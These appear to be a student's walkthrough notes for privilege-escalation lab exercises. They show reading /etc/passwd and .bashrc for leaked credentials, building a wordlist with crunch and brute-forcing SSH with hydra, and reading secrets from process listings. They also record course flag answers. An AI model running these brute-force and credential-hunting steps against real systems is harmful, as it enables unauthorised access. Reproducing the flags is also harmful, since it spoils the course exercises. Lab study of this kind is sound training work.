# User Trails

2. Connect to the VM 2 machine with the provided credentials and try to get the flag that resides under another user's file.

```bash
# Enumerate users
cat /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	...
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	...
	sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
	...
	joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	eve:x:1001:1001:,,,:/home/eve:/bin/bash
	...

cat .bashrc
	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples
	
	# If not running interactively, don't do anything
	case $- in
	    *i*) ;;
	      *) return;;
	esac
	
	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	export SCRIPT_CREDENTIALS="lab"
	HISTCONTROL=ignoreboth
	...

# In attack machine create wordlist to attempt SSH brute force
crunch 6 6 -t Lab%%% > wordlist                                                 ## NOTE!!!!!!    <view below>
	Crunch will now generate the following amount of data: 7000 bytes
	0 MB
	0 GB
	0 TB
	0 PB
	Crunch will now generate the following number of lines: 1000

hydra ssh://192.168.231.214 -l eve -P wordlist
	...
	[DATA] attacking ssh://192.168.231.214:22/
	[22][ssh] host: 192.168.231.214   login: eve   password: Lab123
```
	- ## NOTE!!!!!!    For some reason, even though stored creds show a lowercase 'l', the password uses the uppercase.  Could be a course mats issue?

- Login as `eve` & retrieve flag
```bash
cat .bashrc
	  elif [ -f /etc/bash_completion ]; then
		. /etc/bash_completion
	  fi
	fi
	export PASSWORD=OS{d95b244a2df03c878ca3ca21b607901a}
```


# Service Footprints

2. Connect to VM 2 as the _joe_ user and retrieve the flag using one of the methods explained in this section.
```bash
watch -n 5 "ps -aux | grep OS{"
	Every 5.0s: ps -aux | grep OS{                                                                      debian-privesc: Wed May  1 14:49:01 2024
	
	root      1321  0.0  0.3  15328  6476 ?        S    14:47   0:00 python3 /root/.scripts/flag4.py OS{ecfa3948eb56a2bf37eff4bd96cfe866}
	joe       1554  0.0  0.1   6376  3324 pts/1    S+   14:48   0:00 watch -n 5 ps -aux | grep OS{
	joe       1593  0.0  0.0   6376   872 pts/1    S+   14:49   0:00 watch -n 5 ps -aux | grep OS{
	joe       1594  0.0  0.0   2384   696 pts/1    S+   14:49   0:00 sh -c ps -aux | grep OS{
	joe       1596  0.0  0.0   6072   820 pts/1    S+   14:49   0:00 grep OS{
```


# Insecure File Permissions

